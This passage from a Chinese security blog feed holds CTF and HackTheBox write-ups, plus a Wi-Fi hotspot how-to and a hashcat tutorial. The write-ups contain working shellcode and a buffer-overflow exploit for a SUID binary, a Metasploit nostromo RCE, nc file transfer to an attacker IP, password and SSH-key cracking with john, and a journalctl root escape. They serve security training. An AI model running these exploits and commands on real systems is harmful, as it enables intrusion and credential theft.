class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73&quot;                   <br>&quot;<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>89&quot;                   <br>&quot;<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b&quot;                   <br>&quot;<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80&quot;;<br></code></pre></div></td></tr></table></figure><h2 id="gdb调试选择溢出后的返回地址"><a href="#gdb调试选择溢出后的返回地址" class="headerlink" title="gdb调试选择溢出后的返回地址"></a>gdb调试选择溢出后的返回地址</h2><p>gdb /usr/local/bin/chal</p><p>run $(python -c ‘print “A”*500’)    #这个数字500可以随意设置，但不能小于362，否则不会造成溢出错误；也不能太大，不方便分析。</p><p>x/500x $esp      这条命令的意思是，<strong>查看栈指针寄存器ESP</strong>，500字节的内容，每次输出100字节，按enter键查看下一个100字节内容，分为5次输出</p><p>字符串A，转换为十六进制就是\x41</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/5.PNG" alt="5"></p><p>先随便找一个地址是\x41的地址，比如说0xbffff820</p><p>eip = pack(‘&lt;L’, 0xbffff820)</p><p>这一步的作用是，写一个exp的demo。注意此时的eip是错误的，当我们写好demo以后，就可以使用<code>python exp.py</code>来进行后续调试了。</p><h2 id="exp-demo"><a href="#exp-demo" class="headerlink" title="exp demo"></a>exp demo</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">from struct import pack<br><br>shellcode = &quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73&quot;  #shellcode是c语言二进制代码，<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>89&quot;  #作用是将/bin/sh调出<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b&quot;  #因为程序是suid权限，<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80&quot;  #所以运行后调出/bin/sh就是root权限的shell<br><br>buffersize = 362       #缓冲区长度是362，之前说过如何计算得出<br><br>nop = &quot;<span class="hljs-symbol">\x</span>90&quot; * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用<span class="hljs-symbol">\x</span>90填充<br>eip = pack(&#x27;&lt;L&#x27;, 0xbffff820)            #eip指向返回地址，在溢出完成后，使得指令继续正常向后运行<br>payload = nop + shellcode + eip<br><br>print payload<br></code></pre></div></td></tr></table></figure><p>gdb /usr/local/bin/chal</p><p>run $(python exp.py)</p><p>调试exp demo<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/7.PNG" alt="7"></p><p>run $(python exp.py)</p><p>x/400x $esp  这条命令的意思是，<strong>查看栈指针寄存器ESP</strong>，400字节的内容，每次输出100字节，按enter键查看下一个100字节内容，分为4次输出</p><p>因为exp上写了除了shellcode部分，其余部分用\x90填充</p><p>所以找到一个随便找一个内容是\x90的地址0xbffff7c0<br>修改exp的这一行：<code>eip = pack(&#39;&lt;L&#39;, 0xbffff7c0) </code></p><p>运行exp即可得到root权限：<code>/usr/local/bin/chal $(python exp.py)</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/8.PNG" alt="8"></p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/10.png" alt="10"></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电脑有线宽带共享给手机无线上网</title>
    <link href="/2020/01/02/02-x/"/>
    <url>/2020/01/02/02-x/</url>
    
    <content type="html"><![CDATA[<p>电脑有线宽带共享给手机无线上网，优点：只需要一台电脑，不需要买其他硬件。</p><h2 id="开启wifi"><a href="#开启wifi" class="headerlink" title="开启wifi"></a>开启wifi</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/1.PNG" alt="1"></p><h2 id="确认电脑网卡支持承载网络"><a href="#确认电脑网卡支持承载网络" class="headerlink" title="确认电脑网卡支持承载网络"></a>确认电脑网卡支持承载网络</h2><p>netsh wlan show drivers</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/3.PNG" alt="3"><br>你的网卡必须支持承载网络，如果网卡不支持承载网络，就无法共享wifi给手机上网。</p><p>确认windows已经开启防火墙，否则wifi数据传输可能出错</p><h2 id="cmd命令配置热点名称和密码"><a href="#cmd命令配置热点名称和密码" class="headerlink" title="cmd命令配置热点名称和密码"></a>cmd命令配置热点名称和密码</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">netsh wlan <span class="hljs-builtin-name">set</span> hostednetwork <span class="hljs-attribute">mode</span>=allow <span class="hljs-attribute">ssid</span>=你自己的热点名称 <span class="hljs-attribute">key</span>=热点密码<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/2.PNG" alt="2"></p><p>如果遇到一个问题：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">无法启动承载网络。<br>连到系统上的设备没有发挥作用。<br><br>返回第一步，开启wifi即可<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/10.PNG" alt="10"></p><h2 id="开启热点"><a href="#开启热点" class="headerlink" title="开启热点"></a>开启热点</h2><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">开启WIFI：netsh wlan <span class="hljs-literal">start</span> hostednetwork<br><br>如果需要关闭wifi，需要在手机上关闭<br>关闭WIFI：netsh wlan <span class="hljs-literal">stop</span> hostednetwork<br></code></pre></div></td></tr></table></figure><h2 id="将宽带共享给热点"><a href="#将宽带共享给热点" class="headerlink" title="将宽带共享给热点"></a>将宽带共享给热点</h2><p>选中已经连接互联网的有线网卡，右键——属性——共享，选中设置好的wifi名称。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/4.PNG" alt="4"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-02-02/5.PNG" alt="5"></p><h2 id="现在可以使用手机连接已经设置好的可上网的wifi了。"><a href="#现在可以使用手机连接已经设置好的可上网的wifi了。" class="headerlink" title="现在可以使用手机连接已经设置好的可上网的wifi了。"></a>现在可以使用手机连接已经设置好的可上网的wifi了。</h2>]]></content>
    
    
    <categories>
      
      <category>problem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>problem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Traverxec（ssh2john爆破id_rsa对应密码）</title>
    <link href="/2020/01/01/08-x/"/>
    <url>/2020/01/01/08-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://whale3070.github.io/training/2019/01/07/x/">https://whale3070.github.io/training/2019/01/07/x/</a></p><p>10.10.10.165</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.9</span>p1 Debian <span class="hljs-number">10</span>+deb10u1 (protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">aa:</span><span class="hljs-number">99</span><span class="hljs-symbol">:a8</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">68</span><span class="hljs-symbol">:cd</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:cc</span><span class="hljs-symbol">:f9</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">c:</span><span class="hljs-number">84</span><span class="hljs-symbol">:</span>01<span class="hljs-symbol">:c7</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span>09<span class="hljs-symbol">:</span><span class="hljs-number">5</span>c (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">93</span><span class="hljs-symbol">:dd</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-number">23</span><span class="hljs-symbol">:ee</span><span class="hljs-symbol">:d7</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">f:</span>08<span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">b:</span><span class="hljs-number">58</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span><span class="hljs-symbol">:</span>09<span class="hljs-symbol">:</span><span class="hljs-number">73</span><span class="hljs-symbol">:a3</span><span class="hljs-symbol">:</span><span class="hljs-number">88</span><span class="hljs-symbol">:cc</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">9</span><span class="hljs-symbol">d:</span><span class="hljs-symbol">d6:</span><span class="hljs-number">62</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">e:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">fb:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-number">56</span><span class="hljs-symbol">:</span><span class="hljs-number">92</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:db</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">b:</span>ce (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nostromo <span class="hljs-number">1.9</span>.<span class="hljs-number">6</span><br>|_http-server-<span class="hljs-symbol">header:</span> nostromo <span class="hljs-number">1.9</span>.<span class="hljs-number">6</span><br>|_http-<span class="hljs-symbol">title:</span> TRAVERXEC<br>Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>searchsploit  nostromo</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">nostromo nhttpd <span class="hljs-keyword">is</span> prone <span class="hljs-keyword">to</span> a remote command-execution vulnerability because it fails <span class="hljs-keyword">to</span> properly <span class="hljs-keyword">validate</span> <span class="hljs-keyword">user</span>-supplied data.<br><br>An attacker can exploit this issue <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> arbitrary files <span class="hljs-keyword">and</span> <span class="hljs-keyword">execute</span> arbitrary commands <span class="hljs-keyword">with</span> application-<span class="hljs-keyword">level</span> <span class="hljs-keyword">privileges</span>.<br><br>nostromo versions prior <span class="hljs-keyword">to</span> <span class="hljs-number">1.9</span><span class="hljs-number">.4</span> are affected.<br></code></pre></div></td></tr></table></figure><p>msfconsole</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">search</span> nostromo<br><span class="hljs-keyword">use</span> 0<br><span class="hljs-keyword">set</span> RHOSTS 10.10.10.165<br><span class="hljs-keyword">set</span> LHOST 10.10.14.8<br><span class="hljs-keyword">run</span><br></code></pre></div></td></tr></table></figure><p>得到一个www-data权限的shell</p><p>cat /etc/passwd | grep home<br>david:x:1000:1000:david,,,:/home/david:/bin/bash</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></div></td></tr></table></figure><h2 id="不尝试内核漏洞提权"><a href="#不尝试内核漏洞提权" class="headerlink" title="不尝试内核漏洞提权"></a>不尝试内核漏洞提权</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span> -a<br><span class="hljs-attribute">Linux</span> traverxec <span class="hljs-number">4</span>.<span class="hljs-number">19</span>.<span class="hljs-number">0</span>-<span class="hljs-number">6</span>-amd<span class="hljs-number">64</span> #<span class="hljs-number">1</span> SMP Debian <span class="hljs-number">4</span>.<span class="hljs-number">19</span>.<span class="hljs-number">67</span>-<span class="hljs-number">2</span>+deb<span class="hljs-number">10</span>u<span class="hljs-number">1</span> (<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">20</span>) x<span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br><span class="hljs-attribute">whereis</span> gcc<br></code></pre></div></td></tr></table></figure><p>没有编译器，故不尝试内核漏洞提权。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.4</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/linux-exploit-suggester.sh -P /</span>tmp<br><br>chmod +x <span class="hljs-regexp">/tmp/</span>linux-exploit-suggester.sh<br><br>cd <span class="hljs-regexp">/tmp;./</span>linux-exploit-suggester.sh<br>Possible Exploits:<br><br>[+] [CVE-<span class="hljs-number">2009</span>-<span class="hljs-number">1185</span>] udev <span class="hljs-number">2</span><br><br>   Details: https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/exploits/</span><span class="hljs-number">8478</span>/<br>   Download URL: https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/download/</span><span class="hljs-number">8478</span><br>   Comments: SSH access to non privileged user is needed. Version&lt;<span class="hljs-number">1.4</span>.<span class="hljs-number">1</span> vulnerable but distros use own versioning scheme. Manual verification needed<br></code></pre></div></td></tr></table></figure><h2 id="查找机密文件"><a href="#查找机密文件" class="headerlink" title="查找机密文件"></a>查找机密文件</h2><p>find / -name “index.html” 2&gt;/dev/null<br>找到web目录，查看是否有config文件<br>/var/nostromo/htdocs/index.html</p><hr><p>find / -name “*rsa” 2&gt;/dev/null<br>没找到</p><hr><p>find / -name “<em>ssh</em>“ 2&gt;/dev/null</p><p>find / -name “backup*” 2&gt;/dev/null</p><hr><p>cd /var/nostromo/conf;cat .htpasswd</p><p><code>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</code></p><hr><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /home<br><span class="hljs-attribute">ls</span> -al<br><span class="hljs-attribute">drwx</span>--x--x  <span class="hljs-number">5</span> david david <span class="hljs-number">4096</span> Oct <span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">02</span> david<br></code></pre></div></td></tr></table></figure><p>其他用户只有可执行权限，没有可读权限</p><hr><p>cd /var/nostromo/conf;cat nhttpd.conf</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># HOMEDIRS [OPTIONAL]</span><br><br>homedirs<span class="hljs-string">/home</span><br>homedirs_publicpublic_www<br></code></pre></div></td></tr></table></figure><p>从这里得知，/home/david可能有public_www的目录</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/home/</span>david/public_www;ls -al<br>cd  <span class="hljs-regexp">/home/</span>david<span class="hljs-regexp">/public_www/</span><span class="hljs-keyword">protected</span>-<span class="hljs-keyword">file</span>-area;ls -al<br>download backup-ssh-identity-files.tgz backup.tgz<br></code></pre></div></td></tr></table></figure><p>不能用download命令，只有meterpreter才可以使用download进行文件下载。</p><hr><p><strong>kali主动连接目标机器，失败</strong><br>nc -lnvp 8888 &lt; backup-ssh-identity-files.tgz<br>端口不能小于1024</p><p>nc 10.10.10.165 8888 -w 10 &gt; backup-ssh-identity-files.tgz</p><hr><p><strong>目标机器主动连接kali，成功</strong><br>kali: nc -lnvp 8888 &gt; backup-ssh-identity-files.tgz<br>目标机器：nc 10.10.14.8 8888 -w 10 &lt; backup-ssh-identity-files.tgz</p><p><strong>解压</strong><br>gunzip  backup-ssh-identity-files.tgz<br>解压后，发现/home/david目录下有<code>authorized_keys  id_rsa  id_rsa.pub</code></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>john –wordlist=rockyou.txt whatpass.txt</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: detected hash <span class="hljs-keyword">type</span> &quot;md5crypt&quot;, but the string <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> recognized <span class="hljs-keyword">as</span> &quot;md5crypt-long&quot;<br>Use the &quot;--format=md5crypt-long&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> force loading these <span class="hljs-keyword">as</span> that <span class="hljs-keyword">type</span> <span class="hljs-keyword">instead</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (md5crypt, crypt(<span class="hljs-number">3</span>) <span class="hljs-meta">$1</span>$ (<span class="hljs-keyword">and</span> variants) [MD5 <span class="hljs-number">128</span>/<span class="hljs-number">128</span> AVX <span class="hljs-number">4</span>x3])<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>Nowonly4me       (?)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span>:<span class="hljs-number">04</span> DONE (<span class="hljs-number">2019</span><span class="hljs-number">-12</span><span class="hljs-number">-30</span> <span class="hljs-number">15</span>:<span class="hljs-number">08</span>) <span class="hljs-number">0.004088</span>g/s <span class="hljs-number">43248</span>p/s <span class="hljs-number">43248</span>c/s <span class="hljs-number">43248</span>C/s Noxema..Nowhere<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed<br></code></pre></div></td></tr></table></figure><p>加密格式为md5crypt-long，尝试切换用户，失败<br>su david/Nowonly4me</p><p>su root/Nowonly4me<br>失败</p><h2 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h2><p><code>ssh david@10.10.10.165 -i id_rsa</code><br>输入密码Nowonly4me，失败</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">locate ssh2john<br><span class="hljs-keyword">cd</span> /usr/share/john<br><span class="hljs-keyword">python</span> ssh2john.<span class="hljs-keyword">py</span> <br></code></pre></div></td></tr></table></figure><p>运行后提示了用法</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">python ssh2john.py <span class="hljs-regexp">/root/</span>Documents<span class="hljs-regexp">/target/</span><span class="hljs-number">165</span><span class="hljs-regexp">/home/</span>david<span class="hljs-regexp">/.ssh/i</span>d_rsa &gt; <span class="hljs-regexp">/tmp/</span>out.txt<br><br>cat <span class="hljs-regexp">/tmp/</span>out.txt<br><br>john <span class="hljs-regexp">/tmp/</span>out.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-01-08/1.PNG" alt="1"></p><p>得出了id_rsa对应的密码</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考资料：<a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a></p><p>journalctl 用来查询 systemd-journald 服务收集到的日志。<br>再次尝试ssh登陆，<code>ssh david@10.10.10.165 -i id_rsa</code>，输入密码，登陆成功。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/</span>david/bin;ls<br>cat *.conf<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/sudo /u</span>sr<span class="hljs-regexp">/bin/</span>journalctl -n5 -unostromo.service<br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-01-08/2.PNG" alt="2"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学到了两个知识点：</p><ol><li><p>locate ssh2john</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">python ssh2john.py id_rsa &gt; <span class="hljs-keyword">out</span>.txt<br>john <span class="hljs-keyword">out</span>.txt <span class="hljs-comment">--wordlist=字典</span><br></code></pre></div></td></tr></table></figure><p>可以在有id_rsa私钥的情况下，爆破ssh密码</p></li><li><p>通过二进制可执行程序的提权方式<a href="https://gtfobins.github.io/">gtfobins</a>，下次再开一篇讲解。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hashcat</title>
    <link href="/2019/12/31/11-x/"/>
    <url>/2019/12/31/11-x/</url>
    
    <content type="html"><![CDATA[<h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><p>参考资料：</p><ul><li><p><a href="https://www.youtube.com/watch?v=EfqJCKWtGiU&feature=youtu.be">https://www.youtube.com/watch?v=EfqJCKWtGiU&amp;feature=youtu.be</a></p></li><li><p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><h2 id="kali-vm"><a href="#kali-vm" class="headerlink" title="kali vm"></a>kali vm</h2><p>kali vm自带hashcat，但是该软件需要使用GPU，缺少一些驱动还是什么原因，无法直接使用。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-31-11/1.PNG" alt="1"></p></li></ul><p>查找了一些解决办法，在虚拟机下使用hashcat不是不可以，只是太繁琐了。于是我们直接在windows上安装hashcat吧。</p><h2 id="download-in-windows"><a href="#download-in-windows" class="headerlink" title="download in windows"></a>download in windows</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-31-11/2.PNG" alt="2"></p><h3 id="先查找hash的类型"><a href="#先查找hash的类型" class="headerlink" title="先查找hash的类型"></a>先查找hash的类型</h3><p>根据这个<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">表</a></p><p><code>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</code> 查到Hash-Mode编号为500</p><h3 id="hashcat破解格式"><a href="#hashcat破解格式" class="headerlink" title="hashcat破解格式"></a>hashcat破解格式</h3><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-m hash类型</span><br><span class="hljs-deletion">-a 攻击类型</span><br>文件名<br>字典<br></code></pre></div></td></tr></table></figure><h3 id="准备密码文件"><a href="#准备密码文件" class="headerlink" title="准备密码文件"></a>准备密码文件</h3><p>hash.txt = <code>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</code></p><h3 id="准备字典"><a href="#准备字典" class="headerlink" title="准备字典"></a>准备字典</h3><p>字典使用rockyou.txt</p><p><code>wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></p><h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>hashcat -m 500 -a 0 whatpass.txt /usr/wordlists/rockyou.txt </p><p>同样报错了，但是加–force参数，就可以正常运行了，不知道是为什么。</p><p> 破解过程会显示“[s]tatus[p]ause [r]esume [b]ypass [q]uit =&gt;”，键盘输入“s”显示破解状态，输入“p”暂停破解，输入“r”继续破解，输入“b”表示忽略破解，输入“q”表示退出，所有成功破解的结果都会自动保存在 “hashcat.pot” 文件中。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-31-11/3.PNG" 